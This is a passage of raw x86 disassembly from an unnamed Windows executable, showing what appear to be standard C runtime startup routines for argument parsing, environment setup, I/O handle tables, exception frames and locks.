  424cf2:	jne    0x424d1a
  424cf4:	test   dl,0x1
  424cf7:	jne    0x424d18
  424cf9:	cmp    DWORD PTR [ebp-0x4],0x0
  424cfd:	je     0x424d0b
  424cff:	lea    ecx,[eax+0x1]
  424d02:	cmp    BYTE PTR [ecx],0x22
  424d05:	jne    0x424d0b
  424d07:	mov    eax,ecx
  424d09:	jmp    0x424d0d
  424d0b:	xor    ebx,ebx
  424d0d:	xor    ecx,ecx
  424d0f:	cmp    DWORD PTR [ebp-0x4],ecx
  424d12:	sete   cl
  424d15:	mov    DWORD PTR [ebp-0x4],ecx
  424d18:	shr    edx,1
  424d1a:	test   edx,edx
  424d1c:	je     0x424d2b
  424d1e:	test   edi,edi
  424d20:	je     0x424d26
  424d22:	mov    BYTE PTR [edi],0x5c
  424d25:	inc    edi
  424d26:	inc    DWORD PTR [esi]
  424d28:	dec    edx
  424d29:	jne    0x424d1e
  424d2b:	mov    cl,BYTE PTR [eax]
  424d2d:	test   cl,cl
  424d2f:	je     0x424d79
  424d31:	cmp    DWORD PTR [ebp-0x4],0x0
  424d35:	jne    0x424d41
  424d37:	cmp    cl,0x20
  424d3a:	je     0x424d79
  424d3c:	cmp    cl,0x9
  424d3f:	je     0x424d79
  424d41:	test   ebx,ebx
  424d43:	je     0x424d73
  424d45:	test   edi,edi
  424d47:	je     0x424d62
  424d49:	movzx  edx,cl
  424d4c:	test   BYTE PTR [edx+0x45df21],0x4
  424d53:	je     0x424d5b
  424d55:	mov    BYTE PTR [edi],cl
  424d57:	inc    edi
  424d58:	inc    eax
  424d59:	inc    DWORD PTR [esi]
  424d5b:	mov    cl,BYTE PTR [eax]
  424d5d:	mov    BYTE PTR [edi],cl
  424d5f:	inc    edi
  424d60:	jmp    0x424d71
  424d62:	movzx  ecx,cl
  424d65:	test   BYTE PTR [ecx+0x45df21],0x4
  424d6c:	je     0x424d71
  424d6e:	inc    eax
  424d6f:	inc    DWORD PTR [esi]
  424d71:	inc    DWORD PTR [esi]
  424d73:	inc    eax
  424d74:	jmp    0x424ce1
  424d79:	test   edi,edi
  424d7b:	je     0x424d81
  424d7d:	and    BYTE PTR [edi],0x0
  424d80:	inc    edi
  424d81:	inc    DWORD PTR [esi]
  424d83:	mov    ebx,DWORD PTR [ebp+0xc]
  424d86:	jmp    0x424cac
  424d8b:	mov    eax,DWORD PTR [ebp+0x8]
  424d8e:	test   eax,eax
  424d90:	je     0x424d95
  424d92:	and    DWORD PTR [eax],0x0
  424d95:	inc    DWORD PTR [ebx]
  424d97:	pop    edi
  424d98:	pop    ebx
  424d99:	leave  
  424d9a:	ret    
  424d9b:	push   ebp
  424d9c:	mov    ebp,esp
  424d9e:	push   ecx
  424d9f:	push   ecx
  424da0:	push   ebx
  424da1:	push   esi
  424da2:	push   edi
  424da3:	xor    edi,edi
  424da5:	cmp    DWORD PTR ds:0x45e26c,edi
  424dab:	jne    0x424db2
  424dad:	call   0x425f3c
  424db2:	and    BYTE PTR ds:0x45dc14,0x0
  424db9:	push   0x104
  424dbe:	mov    esi,0x45db10
  424dc3:	push   esi
  424dc4:	push   edi
  424dc5:	call   DWORD PTR ds:0x42906c
  424dcb:	mov    eax,ds:0x45e274
  424dd0:	cmp    eax,edi
  424dd2:	mov    DWORD PTR ds:0x45daf4,esi
  424dd8:	je     0x424de1
  424dda:	cmp    BYTE PTR [eax],0x0
  424ddd:	mov    ebx,eax
  424ddf:	jne    0x424de3
  424de1:	mov    ebx,esi
  424de3:	lea    eax,[ebp-0x4]
  424de6:	push   eax
  424de7:	push   edi
  424de8:	lea    esi,[ebp-0x8]
  424deb:	xor    ecx,ecx
  424ded:	mov    eax,ebx
  424def:	call   0x424c2f
  424df4:	mov    esi,DWORD PTR [ebp-0x4]
  424df7:	mov    eax,DWORD PTR [ebp-0x8]
  424dfa:	shl    esi,0x2
  424dfd:	add    eax,esi
  424dff:	push   eax
  424e00:	call   0x426072
  424e05:	mov    edi,eax
  424e07:	add    esp,0xc
  424e0a:	test   edi,edi
  424e0c:	jne    0x424e13
  424e0e:	or     eax,0xffffffff
  424e11:	jmp    0x424e38
  424e13:	lea    eax,[ebp-0x4]
  424e16:	push   eax
  424e17:	lea    ecx,[esi+edi*1]
  424e1a:	push   edi
  424e1b:	lea    esi,[ebp-0x8]
  424e1e:	mov    eax,ebx
  424e20:	call   0x424c2f
  424e25:	mov    eax,DWORD PTR [ebp-0x4]
  424e28:	dec    eax
  424e29:	pop    ecx
  424e2a:	mov    ds:0x45dad8,eax
  424e2f:	pop    ecx
  424e30:	mov    DWORD PTR ds:0x45dadc,edi
  424e36:	xor    eax,eax
  424e38:	pop    edi
  424e39:	pop    esi
  424e3a:	pop    ebx
  424e3b:	leave  
  424e3c:	ret    
  424e3d:	push   ecx
  424e3e:	push   ecx
  424e3f:	mov    eax,ds:0x45dc18
  424e44:	push   ebx
  424e45:	push   ebp
  424e46:	push   esi
  424e47:	push   edi
  424e48:	mov    edi,DWORD PTR ds:0x429084
  424e4e:	xor    ebx,ebx
  424e50:	xor    esi,esi
  424e52:	cmp    eax,ebx
  424e54:	push   0x2
  424e56:	pop    ebp
  424e57:	jne    0x424e86
  424e59:	call   edi
  424e5b:	mov    esi,eax
  424e5d:	cmp    esi,ebx
  424e5f:	je     0x424e6d
  424e61:	mov    DWORD PTR ds:0x45dc18,0x1
  424e6b:	jmp    0x424e8b
  424e6d:	call   DWORD PTR ds:0x429028
  424e73:	cmp    eax,0x78
  424e76:	jne    0x424e81
  424e78:	mov    eax,ebp
  424e7a:	mov    ds:0x45dc18,eax
  424e7f:	jmp    0x424e86
  424e81:	mov    eax,ds:0x45dc18
  424e86:	cmp    eax,0x1
  424e89:	jne    0x424f08
  424e8b:	cmp    esi,ebx
  424e8d:	jne    0x424e97
  424e8f:	call   edi
  424e91:	mov    esi,eax
  424e93:	cmp    esi,ebx
  424e95:	je     0x424f10
  424e97:	cmp    WORD PTR [esi],bx
  424e9a:	mov    eax,esi
  424e9c:	je     0x424eac
  424e9e:	add    eax,ebp
  424ea0:	cmp    WORD PTR [eax],bx
  424ea3:	jne    0x424e9e
  424ea5:	add    eax,ebp
  424ea7:	cmp    WORD PTR [eax],bx
  424eaa:	jne    0x424e9e
  424eac:	mov    edi,DWORD PTR ds:0x429080
  424eb2:	push   ebx
  424eb3:	push   ebx
  424eb4:	push   ebx
  424eb5:	sub    eax,esi
  424eb7:	push   ebx
  424eb8:	sar    eax,1
  424eba:	inc    eax
  424ebb:	push   eax
  424ebc:	push   esi
  424ebd:	push   ebx
  424ebe:	push   ebx
  424ebf:	mov    DWORD PTR [esp+0x34],eax
  424ec3:	call   edi
  424ec5:	mov    ebp,eax
  424ec7:	cmp    ebp,ebx
  424ec9:	je     0x424efd
  424ecb:	push   ebp
  424ecc:	call   0x426072
  424ed1:	cmp    eax,ebx
  424ed3:	pop    ecx
  424ed4:	mov    DWORD PTR [esp+0x10],eax
  424ed8:	je     0x424efd
  424eda:	push   ebx
  424edb:	push   ebx
  424edc:	push   ebp
  424edd:	push   eax
  424ede:	push   DWORD PTR [esp+0x24]
  424ee2:	push   esi
  424ee3:	push   ebx
  424ee4:	push   ebx
  424ee5:	call   edi
  424ee7:	test   eax,eax
  424ee9:	jne    0x424ef9
  424eeb:	push   DWORD PTR [esp+0x10]
  424eef:	call   0x425f5a
  424ef4:	pop    ecx
  424ef5:	mov    DWORD PTR [esp+0x10],ebx
  424ef9:	mov    ebx,DWORD PTR [esp+0x10]
  424efd:	push   esi
  424efe:	call   DWORD PTR ds:0x42907c
  424f04:	mov    eax,ebx
  424f06:	jmp    0x424f58
  424f08:	cmp    eax,ebp
  424f0a:	je     0x424f14
  424f0c:	cmp    eax,ebx
  424f0e:	je     0x424f14
  424f10:	xor    eax,eax
  424f12:	jmp    0x424f58
  424f14:	call   DWORD PTR ds:0x429078
  424f1a:	mov    esi,eax
  424f1c:	cmp    esi,ebx
  424f1e:	je     0x424f10
  424f20:	cmp    BYTE PTR [esi],bl
  424f22:	je     0x424f2e
  424f24:	inc    eax
  424f25:	cmp    BYTE PTR [eax],bl
  424f27:	jne    0x424f24
  424f29:	inc    eax
  424f2a:	cmp    BYTE PTR [eax],bl
  424f2c:	jne    0x424f24
  424f2e:	sub    eax,esi
  424f30:	inc    eax
  424f31:	mov    ebp,eax
  424f33:	push   ebp
  424f34:	call   0x426072
  424f39:	mov    edi,eax
  424f3b:	cmp    edi,ebx
  424f3d:	pop    ecx
  424f3e:	jne    0x424f44
  424f40:	xor    edi,edi
  424f42:	jmp    0x424f4f
  424f44:	push   ebp
  424f45:	push   esi
  424f46:	push   edi
  424f47:	call   0x426090
  424f4c:	add    esp,0xc
  424f4f:	push   esi
  424f50:	call   DWORD PTR ds:0x429074
  424f56:	mov    eax,edi
  424f58:	pop    edi
  424f59:	pop    esi
  424f5a:	pop    ebp
  424f5b:	pop    ebx
  424f5c:	pop    ecx
  424f5d:	pop    ecx
  424f5e:	ret    
  424f5f:	sub    esp,0x48
  424f62:	push   ebx
  424f63:	mov    ebx,0x480
  424f68:	push   ebx
  424f69:	call   0x426072
  424f6e:	test   eax,eax
  424f70:	pop    ecx
  424f71:	jne    0x424f7b
  424f73:	or     eax,0xffffffff
  424f76:	jmp    0x425158
  424f7b:	mov    ds:0x45e160,eax
  424f80:	mov    DWORD PTR ds:0x45e148,0x20
  424f8a:	lea    ecx,[eax+0x480]
  424f90:	jmp    0x424fb0
  424f92:	and    BYTE PTR [eax+0x4],0x0
  424f96:	or     DWORD PTR [eax],0xffffffff
  424f99:	and    DWORD PTR [eax+0x8],0x0
  424f9d:	mov    BYTE PTR [eax+0x5],0xa
  424fa1:	mov    ecx,DWORD PTR ds:0x45e160
  424fa7:	add    eax,0x24
  424faa:	add    ecx,0x480
  424fb0:	cmp    eax,ecx
  424fb2:	jb     0x424f92
  424fb4:	push   ebp
  424fb5:	push   esi
  424fb6:	push   edi
  424fb7:	lea    eax,[esp+0x14]
  424fbb:	push   eax
  424fbc:	call   DWORD PTR ds:0x429050
  424fc2:	cmp    WORD PTR [esp+0x46],0x0
  424fc8:	je     0x4250b7
  424fce:	mov    eax,DWORD PTR [esp+0x48]
  424fd2:	test   eax,eax
  424fd4:	je     0x4250b7
  424fda:	mov    edi,DWORD PTR [eax]
  424fdc:	lea    ebp,[eax+0x4]
  424fdf:	lea    eax,[edi+ebp*1]
  424fe2:	mov    DWORD PTR [esp+0x10],eax
  424fe6:	mov    eax,0x800
  424feb:	cmp    edi,eax
  424fed:	jl     0x424ff1
  424fef:	mov    edi,eax
  424ff1:	cmp    DWORD PTR ds:0x45e148,edi
  424ff7:	jge    0x425047
  424ff9:	mov    esi,0x45e164
  424ffe:	push   ebx
  424fff:	call   0x426072
  425004:	test   eax,eax
  425006:	pop    ecx
  425007:	je     0x425041
  425009:	add    DWORD PTR ds:0x45e148,0x20
  425010:	mov    DWORD PTR [esi],eax
  425012:	lea    ecx,[eax+0x480]
  425018:	jmp    0x425030
  42501a:	and    BYTE PTR [eax+0x4],0x0
  42501e:	or     DWORD PTR [eax],0xffffffff
  425021:	and    DWORD PTR [eax+0x8],0x0
  425025:	mov    BYTE PTR [eax+0x5],0xa
  425029:	mov    ecx,DWORD PTR [esi]
  42502b:	add    eax,0x24
  42502e:	add    ecx,ebx
  425030:	cmp    eax,ecx
  425032:	jb     0x42501a
  425034:	add    esi,0x4
  425037:	cmp    DWORD PTR ds:0x45e148,edi
  42503d:	jl     0x424ffe
  42503f:	jmp    0x425047
  425041:	mov    edi,DWORD PTR ds:0x45e148
  425047:	xor    ebx,ebx
  425049:	test   edi,edi
  42504b:	jle    0x4250b7
  42504d:	mov    eax,DWORD PTR [esp+0x10]
  425051:	mov    eax,DWORD PTR [eax]
  425053:	cmp    eax,0xffffffff
  425056:	je     0x4250ac
  425058:	mov    cl,BYTE PTR [ebp+0x0]
  42505b:	test   cl,0x1
  42505e:	je     0x4250ac
  425060:	test   cl,0x8
  425063:	jne    0x425070
  425065:	push   eax
  425066:	call   DWORD PTR ds:0x42908c
  42506c:	test   eax,eax
  42506e:	je     0x4250ac
  425070:	mov    ecx,ebx
  425072:	mov    eax,ebx
  425074:	and    eax,0x1f
  425077:	lea    eax,[eax+eax*8]
  42507a:	sar    ecx,0x5
  42507d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425084:	lea    esi,[ecx+eax*4]
  425087:	mov    eax,DWORD PTR [esp+0x10]
  42508b:	mov    eax,DWORD PTR [eax]
  42508d:	mov    DWORD PTR [esi],eax
  42508f:	mov    al,BYTE PTR [ebp+0x0]
  425092:	mov    BYTE PTR [esi+0x4],al
  425095:	lea    eax,[esi+0xc]
  425098:	push   0xfa0
  42509d:	push   eax
  42509e:	call   0x4263dd
  4250a3:	test   eax,eax
  4250a5:	pop    ecx
  4250a6:	pop    ecx
  4250a7:	je     0x4250d7
  4250a9:	inc    DWORD PTR [esi+0x8]
  4250ac:	add    DWORD PTR [esp+0x10],0x4
  4250b1:	inc    ebx
  4250b2:	inc    ebp
  4250b3:	cmp    ebx,edi
  4250b5:	jl     0x42504d
  4250b7:	xor    ebx,ebx
  4250b9:	mov    ecx,DWORD PTR ds:0x45e160
  4250bf:	lea    eax,[ebx+ebx*8]
  4250c2:	lea    esi,[ecx+eax*4]
  4250c5:	cmp    DWORD PTR [esi],0xffffffff
  4250c8:	jne    0x425139
  4250ca:	test   ebx,ebx
  4250cc:	mov    BYTE PTR [esi+0x4],0x81
  4250d0:	jne    0x4250dc
  4250d2:	push   0xfffffff6
  4250d4:	pop    eax
  4250d5:	jmp    0x4250e6
  4250d7:	or     eax,0xffffffff
  4250da:	jmp    0x425155
  4250dc:	mov    eax,ebx
  4250de:	dec    eax
  4250df:	neg    eax
  4250e1:	sbb    eax,eax
  4250e3:	add    eax,0xfffffff5
  4250e6:	push   eax
  4250e7:	call   DWORD PTR ds:0x429068
  4250ed:	mov    edi,eax
  4250ef:	cmp    edi,0xffffffff
  4250f2:	je     0x425133
  4250f4:	push   edi
  4250f5:	call   DWORD PTR ds:0x42908c
  4250fb:	test   eax,eax
  4250fd:	je     0x425133
  4250ff:	and    eax,0xff
  425104:	cmp    eax,0x2
  425107:	mov    DWORD PTR [esi],edi
  425109:	jne    0x425111
  42510b:	or     BYTE PTR [esi+0x4],0x40
  42510f:	jmp    0x42511a
  425111:	cmp    eax,0x3
  425114:	jne    0x42511a
  425116:	or     BYTE PTR [esi+0x4],0x8
  42511a:	lea    eax,[esi+0xc]
  42511d:	push   0xfa0
  425122:	push   eax
  425123:	call   0x4263dd
  425128:	test   eax,eax
  42512a:	pop    ecx
  42512b:	pop    ecx
  42512c:	je     0x4250d7
  42512e:	inc    DWORD PTR [esi+0x8]
  425131:	jmp    0x42513d
  425133:	or     BYTE PTR [esi+0x4],0x40
  425137:	jmp    0x42513d
  425139:	or     BYTE PTR [esi+0x4],0x80
  42513d:	inc    ebx
  42513e:	cmp    ebx,0x3
  425141:	jl     0x4250b9
  425147:	push   DWORD PTR ds:0x45e148
  42514d:	call   DWORD PTR ds:0x429088
  425153:	xor    eax,eax
  425155:	pop    edi
  425156:	pop    esi
  425157:	pop    ebp
  425158:	pop    ebx
  425159:	add    esp,0x48
  42515c:	ret    
  42515d:	push   0xc
  42515f:	push   0x4295b8
  425164:	call   0x425350
  425169:	mov    DWORD PTR [ebp-0x1c],0x42a010
  425170:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  425177:	jae    0x42519b
  425179:	and    DWORD PTR [ebp-0x4],0x0
  42517d:	mov    eax,DWORD PTR [ebp-0x1c]
  425180:	mov    eax,DWORD PTR [eax]
  425182:	test   eax,eax
  425184:	je     0x425191
  425186:	call   eax
  425188:	jmp    0x425191
  42518a:	xor    eax,eax
  42518c:	inc    eax
  42518d:	ret    
  42518e:	mov    esp,DWORD PTR [ebp-0x18]
  425191:	or     DWORD PTR [ebp-0x4],0xffffffff
  425195:	add    DWORD PTR [ebp-0x1c],0x4
  425199:	jmp    0x425170
  42519b:	call   0x42538b
  4251a0:	ret    
  4251a1:	push   0xc
  4251a3:	push   0x4295c8
  4251a8:	call   0x425350
  4251ad:	mov    DWORD PTR [ebp-0x1c],0x42a018
  4251b4:	cmp    DWORD PTR [ebp-0x1c],0x42a018
  4251bb:	jae    0x4251df
  4251bd:	and    DWORD PTR [ebp-0x4],0x0
  4251c1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251c4:	mov    eax,DWORD PTR [eax]
  4251c6:	test   eax,eax
  4251c8:	je     0x4251d5
  4251ca:	call   eax
  4251cc:	jmp    0x4251d5
  4251ce:	xor    eax,eax
  4251d0:	inc    eax
  4251d1:	ret    
  4251d2:	mov    esp,DWORD PTR [ebp-0x18]
  4251d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251d9:	add    DWORD PTR [ebp-0x1c],0x4
  4251dd:	jmp    0x4251b4
  4251df:	call   0x42538b
  4251e4:	ret    
  4251e5:	call   0x425426
  4251ea:	mov    eax,ds:0x45d304
  4251ef:	cmp    eax,0xffffffff
  4251f2:	je     0x425202
  4251f4:	push   eax
  4251f5:	call   DWORD PTR ds:0x429094
  4251fb:	or     DWORD PTR ds:0x45d304,0xffffffff
  425202:	ret    
  425203:	push   ebx
  425204:	push   esi
  425205:	call   DWORD PTR ds:0x429028
  42520b:	push   DWORD PTR ds:0x45d304
  425211:	mov    ebx,eax
  425213:	call   DWORD PTR ds:0x4290a4
  425219:	mov    esi,eax
  42521b:	test   esi,esi
  42521d:	jne    0x425268
  42521f:	push   0x88
  425224:	push   0x1
  425226:	call   0x426468
  42522b:	mov    esi,eax
  42522d:	test   esi,esi
  42522f:	pop    ecx
  425230:	pop    ecx
  425231:	je     0x425260
  425233:	push   esi
  425234:	push   DWORD PTR ds:0x45d304
  42523a:	call   DWORD PTR ds:0x4290a0
  425240:	test   eax,eax
  425242:	je     0x425260
  425244:	mov    DWORD PTR [esi+0x54],0x45d258
  42524b:	mov    DWORD PTR [esi+0x14],0x1
  425252:	call   DWORD PTR ds:0x42909c
  425258:	or     DWORD PTR [esi+0x4],0xffffffff
  42525c:	mov    DWORD PTR [esi],eax
  42525e:	jmp    0x425268
  425260:	push   0x10
  425262:	call   0x424416
  425267:	pop    ecx
  425268:	push   ebx
  425269:	call   DWORD PTR ds:0x429098
  42526f:	mov    eax,esi
  425271:	pop    esi
  425272:	pop    ebx
  425273:	ret    
  425274:	call   0x4253dd
  425279:	test   eax,eax
  42527b:	je     0x42528d
  42527d:	call   DWORD PTR ds:0x4290a8
  425283:	cmp    eax,0xffffffff
  425286:	mov    ds:0x45d304,eax
  42528b:	jne    0x425295
  42528d:	call   0x4251e5
  425292:	xor    eax,eax
  425294:	ret    
  425295:	push   esi
  425296:	push   0x88
  42529b:	push   0x1
  42529d:	call   0x426468
  4252a2:	mov    esi,eax
  4252a4:	test   esi,esi
  4252a6:	pop    ecx
  4252a7:	pop    ecx
  4252a8:	je     0x4252da
  4252aa:	push   esi
  4252ab:	push   DWORD PTR ds:0x45d304
  4252b1:	call   DWORD PTR ds:0x4290a0
  4252b7:	test   eax,eax
  4252b9:	je     0x4252da
  4252bb:	mov    DWORD PTR [esi+0x54],0x45d258
  4252c2:	mov    DWORD PTR [esi+0x14],0x1
  4252c9:	call   DWORD PTR ds:0x42909c
  4252cf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252d3:	mov    DWORD PTR [esi],eax
  4252d5:	xor    eax,eax
  4252d7:	inc    eax
  4252d8:	pop    esi
  4252d9:	ret    
  4252da:	call   0x4251e5
  4252df:	xor    eax,eax
  4252e1:	pop    esi
  4252e2:	ret    
  4252e3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252ea:	jne    0x4252f9
  4252ec:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252f3:	jb     0x4252f9
  4252f5:	xor    eax,eax
  4252f7:	inc    eax
  4252f8:	ret    
  4252f9:	push   0x3
  4252fb:	pop    eax
  4252fc:	ret    
  4252fd:	xor    eax,eax
  4252ff:	cmp    DWORD PTR [esp+0x4],eax
  425303:	push   0x0
  425305:	sete   al
  425308:	push   0x1000
  42530d:	push   eax
  42530e:	call   DWORD PTR ds:0x429034
  425314:	test   eax,eax
  425316:	mov    ds:0x45e140,eax
  42531b:	je     0x425347
  42531d:	call   0x4252e3
  425322:	cmp    eax,0x3
  425325:	mov    ds:0x45e144,eax
  42532a:	jne    0x42534a
  42532c:	push   0x3f8
  425331:	call   0x4266ea
  425336:	test   eax,eax
  425338:	pop    ecx
  425339:	jne    0x42534a
  42533b:	push   DWORD PTR ds:0x45e140
  425341:	call   DWORD PTR ds:0x4290ac
  425347:	xor    eax,eax
  425349:	ret    
  42534a:	xor    eax,eax
  42534c:	inc    eax
  42534d:	ret    
  42534e:	int3   
  42534f:	int3   
  425350:	push   0x427218
  425355:	mov    eax,fs:0x0
  42535b:	push   eax
  42535c:	mov    eax,DWORD PTR [esp+0x10]
  425360:	mov    DWORD PTR [esp+0x10],ebp
  425364:	lea    ebp,[esp+0x10]
  425368:	sub    esp,eax
  42536a:	push   ebx
  42536b:	push   esi
  42536c:	push   edi
  42536d:	mov    eax,DWORD PTR [ebp-0x8]
  425370:	mov    DWORD PTR [ebp-0x18],esp
  425373:	push   eax
  425374:	mov    eax,DWORD PTR [ebp-0x4]
  425377:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42537e:	mov    DWORD PTR [ebp-0x8],eax
  425381:	lea    eax,[ebp-0x10]
  425384:	mov    fs:0x0,eax
  42538a:	ret    
  42538b:	mov    ecx,DWORD PTR [ebp-0x10]
  42538e:	mov    DWORD PTR fs:0x0,ecx
  425395:	pop    ecx
  425396:	pop    edi
  425397:	pop    esi
  425398:	pop    ebx
  425399:	leave  
  42539a:	push   ecx
  42539b:	ret    
  42539c:	int3   
  42539d:	int3   
  42539e:	int3   
  42539f:	int3   
  4253a0:	cmp    eax,0x1000
  4253a5:	jae    0x4253b5
  4253a7:	neg    eax
  4253a9:	add    eax,esp
  4253ab:	add    eax,0x4
  4253ae:	test   DWORD PTR [eax],eax
  4253b0:	xchg   esp,eax
  4253b1:	mov    eax,DWORD PTR [eax]
  4253b3:	push   eax
  4253b4:	ret    
  4253b5:	push   ecx
  4253b6:	lea    ecx,[esp+0x8]
  4253ba:	sub    ecx,0x1000
  4253c0:	sub    eax,0x1000
  4253c5:	test   DWORD PTR [ecx],eax
  4253c7:	cmp    eax,0x1000
  4253cc:	jae    0x4253ba
  4253ce:	sub    ecx,eax
  4253d0:	mov    eax,esp
  4253d2:	test   DWORD PTR [ecx],eax
  4253d4:	mov    esp,ecx
  4253d6:	mov    ecx,DWORD PTR [eax]
  4253d8:	mov    eax,DWORD PTR [eax+0x4]
  4253db:	push   eax
  4253dc:	ret    
  4253dd:	push   esi
  4253de:	push   edi
  4253df:	xor    esi,esi
  4253e1:	mov    edi,0x45dc20
  4253e6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253ee:	jne    0x42540e
  4253f0:	lea    eax,[esi*8+0x45d310]
  4253f7:	mov    DWORD PTR [eax],edi
  4253f9:	push   0xfa0
  4253fe:	push   DWORD PTR [eax]
  425400:	add    edi,0x18
  425403:	call   0x4263dd
  425408:	test   eax,eax
  42540a:	pop    ecx
  42540b:	pop    ecx
  42540c:	je     0x42541a
  42540e:	inc    esi
  42540f:	cmp    esi,0x24
  425412:	jl     0x4253e6
  425414:	xor    eax,eax
  425416:	inc    eax
  425417:	pop    edi
  425418:	pop    esi
  425419:	ret    
  42541a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425422:	xor    eax,eax
  425424:	jmp    0x425417
  425426:	push   ebx
  425427:	mov    ebx,DWORD PTR ds:0x429090
  42542d:	push   esi
  42542e:	mov    esi,0x45d310
  425433:	push   edi
  425434:	mov    edi,DWORD PTR [esi]
  425436:	test   edi,edi
  425438:	je     0x42544d
  42543a:	cmp    DWORD PTR [esi+0x4],0x1
  42543e:	je     0x42544d
  425440:	push   edi
  425441:	call   ebx
  425443:	push   edi
  425444:	call   0x425f5a
  425449:	and    DWORD PTR [esi],0x0
  42544c:	pop    ecx
  42544d:	add    esi,0x8
  425450:	cmp    esi,0x45d430
  425456:	jl     0x425434
  425458:	mov    esi,0x45d310
  42545d:	pop    edi
  42545e:	mov    eax,DWORD PTR [esi]
  425460:	test   eax,eax
  425462:	je     0x42546d
  425464:	cmp    DWORD PTR [esi+0x4],0x1
  425468:	jne    0x42546d
  42546a:	push   eax
  42546b:	call   ebx
  42546d:	add    esi,0x8
  425470:	cmp    esi,0x45d430
  425476:	jl     0x42545e
  425478:	pop    esi
  425479:	pop    ebx
  42547a:	ret    
  42547b:	push   ebp
  42547c:	mov    ebp,esp
  42547e:	mov    eax,DWORD PTR [ebp+0x8]
  425481:	push   DWORD PTR [eax*8+0x45d310]
  425488:	call   DWORD PTR ds:0x4290b4
  42548e:	pop    ebp
  42548f:	ret    
  425490:	push   ebp
  425491:	mov    ebp,esp
  425493:	push   esi
  425494:	mov    esi,DWORD PTR [ebp+0x8]
  425497:	lea    esi,[esi*8+0x45d310]
  42549e:	cmp    DWORD PTR [esi],0x0
  4254a1:	je     0x4254a8
  4254a3:	xor    eax,eax
  4254a5:	inc    eax
  4254a6:	jmp    0x42550c
  4254a8:	push   edi
  4254a9:	push   0x18
  4254ab:	call   0x426072
  4254b0:	mov    edi,eax
  4254b2:	test   edi,edi
  4254b4:	pop    ecx
  4254b5:	jne    0x4254c6
  4254b7:	call   0x4272f0
  4254bc:	mov    DWORD PTR [eax],0xc
  4254c2:	xor    eax,eax
  4254c4:	jmp    0x42550b
  4254c6:	push   0xa
  4254c8:	call   0x42550f
  4254cd:	cmp    DWORD PTR [esi],0x0
  4254d0:	pop    ecx
  4254d1:	jne    0x4254f9
  4254d3:	push   0xfa0
  4254d8:	push   edi
  4254d9:	call   0x4263dd
  4254de:	test   eax,eax
  4254e0:	pop    ecx
  4254e1:	pop    ecx
  4254e2:	jne    0x4254f5
  4254e4:	push   edi
  4254e5:	call   0x425f5a
  4254ea:	push   0xa
  4254ec:	call   0x42547b
  4254f1:	pop    ecx
  4254f2:	pop    ecx
  4254f3:	jmp    0x4254b7
  4254f5:	mov    DWORD PTR [esi],edi
  4254f7:	jmp    0x425500
  4254f9:	push   edi
  4254fa:	call   0x425f5a
  4254ff:	pop    ecx
  425500:	push   0xa
  425502:	call   0x42547b
  425507:	xor    eax,eax
  425509:	pop    ecx
  42550a:	inc    eax
  42550b:	pop    edi
  42550c:	pop    esi
  42550d:	pop    ebp
  42550e:	ret    
  42550f:	push   ebp
  425510:	mov    ebp,esp
  425512:	mov    eax,DWORD PTR [ebp+0x8]
  425515:	push   esi
  425516:	lea    esi,[eax*8+0x45d310]
  42551d:	cmp    DWORD PTR [esi],0x0
  425520:	jne    0x425535
  425522:	push   eax
  425523:	call   0x425490
  425528:	test   eax,eax
  42552a:	pop    ecx
  42552b:	jne    0x425535
  42552d:	push   0x11
  42552f:	call   0x424416
  425534:	pop    ecx
  425535:	push   DWORD PTR [esi]
  425537:	call   DWORD PTR ds:0x4290b8
  42553d:	pop    esi
  42553e:	pop    ebp
  42553f:	ret    
  425540:	push   esi
  425541:	push   DWORD PTR ds:0x45e268
  425547:	call   0x4274a6
  42554c:	pop    ecx
  42554d:	mov    ecx,DWORD PTR ds:0x45e264
  425553:	mov    esi,eax
  425555:	mov    eax,ds:0x45e268
  42555a:	mov    edx,ecx
  42555c:	sub    edx,eax
  42555e:	add    edx,0x4
  425561:	cmp    esi,edx
  425563:	jae    0x4255b3
  425565:	mov    ecx,0x800
  42556a:	cmp    esi,ecx
  42556c:	jae    0x425570
  42556e:	mov    ecx,esi
  425570:	add    ecx,esi
  425572:	push   ecx
  425573:	push   eax
  425574:	call   0x4272f9
  425579:	test   eax,eax
  42557b:	pop    ecx
  42557c:	pop    ecx
  42557d:	jne    0x425596
  42557f:	add    esi,0x10
  425582:	push   esi
  425583:	push   DWORD PTR ds:0x45e268
  425589:	call   0x4272f9
  42558e:	test   eax,eax
  425590:	pop    ecx
  425591:	pop    ecx
  425592:	jne    0x425596
  425594:	pop    esi
  425595:	ret    
  425596:	mov    ecx,DWORD PTR ds:0x45e264
  42559c:	sub    ecx,DWORD PTR ds:0x45e268
  4255a2:	mov    ds:0x45e268,eax
  4255a7:	sar    ecx,0x2
  4255aa:	lea    ecx,[eax+ecx*4]
  4255ad:	mov    DWORD PTR ds:0x45e264,ecx
  4255b3:	mov    DWORD PTR [ecx],edi
  4255b5:	add    DWORD PTR ds:0x45e264,0x4
  4255bc:	mov    eax,edi
  4255be:	pop    esi
  4255bf:	ret    
  4255c0:	push   0x80
  4255c5:	call   0x426072
  4255ca:	test   eax,eax
  4255cc:	pop    ecx
  4255cd:	mov    ds:0x45e268,eax
  4255d2:	jne    0x4255d8
  4255d4:	push   0x18
  4255d6:	pop    eax
  4255d7:	ret    
  4255d8:	and    DWORD PTR [eax],0x0
  4255db:	mov    eax,ds:0x45e268
  4255e0:	mov    ds:0x45e264,eax
  4255e5:	xor    eax,eax
  4255e7:	ret    
  4255e8:	push   0xc
  4255ea:	push   0x4295d8
  4255ef:	call   0x425350
  4255f4:	call   0x424661
  4255f9:	and    DWORD PTR [ebp-0x4],0x0
  4255fd:	mov    edi,DWORD PTR [ebp+0x8]
  425600:	call   0x425540
  425605:	mov    DWORD PTR [ebp-0x1c],eax
  425608:	or     DWORD PTR [ebp-0x4],0xffffffff
  42560c:	call   0x42561a
  425611:	mov    eax,DWORD PTR [ebp-0x1c]
  425614:	call   0x42538b
  425619:	ret    
  42561a:	call   0x42466a
  42561f:	ret    
  425620:	push   DWORD PTR [esp+0x4]
  425624:	call   0x4255e8
  425629:	neg    eax
